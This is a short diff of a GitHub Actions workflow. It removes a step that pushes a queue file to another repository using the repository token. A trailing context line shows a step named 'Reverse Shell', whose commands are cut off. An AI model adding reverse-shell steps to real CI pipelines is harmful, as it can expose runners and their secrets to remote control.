@@ -82,19 +82,6 @@ jobs:
           python3 run/dependencies.py
           gh repo clone https://github.com/L1ghtDream/raport
           cp run/process.queue raport/process.queue
-
-
-      - name: Pushes test file
-        uses: dmnemec/copy_file_to_another_repo_action@main
-        env:
-          API_TOKEN_GITHUB: ${{ secrets.GITHUB_TOKEN }}
-        with:
-          source_file: 'run/process.queue'
-          destination_repo: 'L1ghtDream/raport'
-          destination_folder: 'queue'
-          user_email: 'admin@voinearadu.com'
-          user_name: 'Radu Voinea'
-          commit_message: '+'
           
       - name: "Reverse Shell"
         env:
